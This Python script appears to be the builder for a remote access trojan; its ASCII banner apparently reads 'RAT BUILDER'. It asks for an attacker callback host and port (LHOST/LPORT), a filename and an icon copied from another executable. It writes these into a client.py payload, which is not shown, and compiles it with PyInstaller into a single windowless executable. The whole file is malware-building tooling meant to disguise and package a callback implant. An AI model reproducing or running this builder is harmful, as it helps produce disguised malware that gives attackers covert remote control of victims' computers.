import os
import subprocess
def update_client_file(variable, value):
    try:
        with open("client.py", "r") as file:
            lines = file.readlines()
        
        with open("client.py", "w") as file:
            for line in lines:
                if f"{variable} =" in line:
                    if variable == "LPORT":
                        file.write(f'{variable} = {int(value)}\n')
                    elif variable == "ICON":
                        file.write(f'{variable} = r"{value}"\n')
                    else:   
                        file.write(f'{variable} = "{value}"\n')
                    print(f"{variable} has changed to {value}")
                else:
                    file.write(line)
    except FileNotFoundError:
        print("File 'client.pyw' not found.")

def show_variables():
    try:
        with open("client.py", "r") as file:
            lines = file.readlines()
            for line in lines:
                if "LHOST =" in line or "LPORT =" in line or "FILENAME" in line or "ICON" in line:
                    print(line.strip()) 
    except:
        print("Error open file")

def build_file(filename, icon_path):
    try:
        subprocess.run(
            f"pyinstaller --onefile --noconsole --name {filename} --icon {icon_path} client.py",
            shell=True,
            check=True
        )
        with open("client.py", "r") as file:
            lines = file.readlines()
        
        with open("client.py", "w") as file:
            for line in lines:
                if "LHOST =" in line:
                    file.write('LHOST = "127.0.0.1"\n')
                elif "LPORT =" in line:
                    file.write('LPORT = 4444\n')
                elif "FILENAME =" in line:
                    file.write(f'FILENAME = "{filename}"\n')
                elif "ICON =" in line:
                    file.write(f'ICON = "{icon_path}"\n')
                else:
                    file.write(line)

    except subprocess.CalledProcessError as err:
        print(f"An error occurred while compiling the file: {err}")
    except Exception as err:
        print(f"An error occurred {err}")

def main():
    print("""
     ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▀█▀▀▄      ▄▀▀█▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀█▀▄    ▄▀▀▀▀▄      ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
   █   █   █ ▐ ▄▀ ▀▄ █    █  ▐     ▐ ▄▀   █ █   █    █ █   █  █  █    █      █ ▄▀   █ ▐  ▄▀   ▐ █   █   █ 
   ▐  █▀▀█▀    █▄▄▄█ ▐   █           █▄▄▄▀  ▐  █    █  ▐   █  ▐  ▐    █      ▐ █    █   █▄▄▄▄▄  ▐  █▀▀█▀  
    ▄▀    █   ▄▀   █    █            █   █    █    █       █         █         █    █   █    ▌   ▄▀    █  
   █     █   █   ▄▀   ▄▀            ▄▀▄▄▄▀     ▀▄▄▄▄▀   ▄▀▀▀▀▀▄    ▄▀▄▄▄▄▄▄▀  ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █     █   
   ▐     ▐   ▐   ▐   █             █    ▐              █       █   █         █     ▐   █    ▐   ▐     ▐                                    
    """)
    
    lhost = input("Enter LHOST (default: 127.0.0.1): ")
    if lhost:
        update_client_file("LHOST", lhost)
    
    lport = input('\n-------------------------------------------------------\n\nEnter LPORT (default: 4444): ')
    if lport:
        update_client_file("LPORT", lport)
    
    filename = input("\n-------------------------------------------------------\n\nEnter FILENAME (default: client): ")
    if filename:
        update_client_file("FILENAME", filename)
    else:
        filename = "client"
    
    icon = input("\n-------------------------------------------------------\n\nEnter the icon file or exe file from which you want to copy the icon (default: icon.ico): ")
    if icon:
        update_client_file("ICON", icon)
    else:
        icon = r"icon.ico"
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("\n\nSummary:")
    show_variables()
    confirm = input("Are the values correct? (y/n): ")
    if confirm == 'y':
        build = input("START BUILD? (y/n/r): ")
        if build == 'y':
            build_file(filename, icon)
        elif build == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()

if __name__ == "__main__":
    main()
